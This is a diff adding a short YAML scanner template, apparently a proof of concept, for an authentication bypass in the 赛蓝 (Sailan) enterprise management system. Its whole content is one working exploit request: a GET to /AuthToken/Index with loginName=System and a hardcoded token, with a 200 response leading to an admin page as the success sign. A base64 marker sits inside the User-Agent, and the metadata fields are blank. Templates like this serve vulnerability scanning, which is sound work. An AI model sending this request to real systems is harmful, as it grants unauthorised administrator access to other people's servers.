@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 赛蓝企业管理系统AuthToken_Index 身份认证绕过漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64MHhzZWM=; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    Connection: keep-alive
+response1:
+  body: /Home6/AdminPretty
+  code: 200
+requests2:
+response2:
